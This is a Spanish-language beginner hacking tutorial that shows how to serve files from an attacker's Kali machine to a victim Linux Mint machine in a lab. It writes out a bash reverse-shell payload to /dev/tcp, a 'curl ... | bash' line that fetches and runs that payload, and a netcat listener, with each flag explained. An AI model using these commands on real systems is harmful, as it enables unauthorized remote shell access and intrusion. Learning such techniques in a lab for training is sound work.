
---
- TAG: #Introducción #hacking #basico #HTTP #ReverShell #Python
----
# Transferir Archivos con un Servidor HTTP en la Red Interna

En este apartado, voy a compartir cómo transferir archivos con el servidor `http` en mi red interna. Ya que es muy importante cuando logremos acceder a nuestra máquina objetivo, es muy común que queramos escalar privilegios, encontrar alguna vulnerabilidad, incluso si queremos hacer algo de pivoting. Es muy importante poder transferir archivos desde mi máquina atacante a mi máquina víctima. Para ello, lo más común es levantar un servidor http compartiendo el archivo que deseemos compartir. En el siguiente ejemplo, estaremos viendo unos pequeños ejemplos desde mi máquina Kali Linux hacia mi máquina objetivo Linux Mint.

# Máquina Kali Linux (Atacante)

Vamos a crearn un `payload.sh`:

```bash
#!/bin/bash  
bash -i >& /dev/tcp/1.2.3.4/443 0>&1
```

Es la típica para crear una reverse shell con nuestra dirección IP de nuestra propia máquina atacante.

Ahora, para compartir el payload con nuestra máquina víctima, levantamos un servidor _http_ por el puerto _80_ con todos los archivos que tenemos en el directorio actual:

```python
python -m http.server 80
```

Si ejecutamos el comando, tendremos un servidor web levantado por el puerto 80, compartiendo todo lo del directorio actual donde se encuentra el archivo `payload.sh`.

Ahora nos dirigimos a nuestra máquina Linux Mint.

# Máquina Linux Mint (Víctima)

Abrimos el navegador y colocamos la dirección IP de la máquina Kali Linux.

También, si tenemos la opción de ejecución remota, dentro de la máquina víctima lo más óptimo es ejecutar el comando `curl` o `wget`.

Con `curl`:

```bash
curl http://1.2.3.4/payload.sh | bash
```

Por otro lado, en nuestra máquina **Kali Linux** usamos el siguiente comando:

```bash
sudo nc -nlvp 443
```

`nc` se refiere a `netcat`. Aquí está el desglose del comando:

- `sudo`: Ejecuta el comando con privilegios de superusuario. Esto es necesario si estás utilizando un puerto privilegiado (menor a 1024), como el puerto 443.
- `nc`: Llama a `netcat`, la utilidad de red.
- `-n`: Evita hacer búsquedas de nombres de host. Netcat usará directamente las direcciones IP.
- `-l`: Coloca a `netcat` en modo de escucha, esperando conexiones entrantes.
- `-v`: Modo detallado (verbose). Proporciona más información sobre lo que está haciendo `netcat`.
- `-p 443`: Especifica el puerto en el que `netcat` debe escuchar. En este caso, es el puerto 443.

Este comando debería ejecutarse primero en la máquina atacante **Kali Linux** y luego el comando `curl http://1.2.3.4/payload.sh | bash`.

Esto permite compartir archivos a través del servidor web.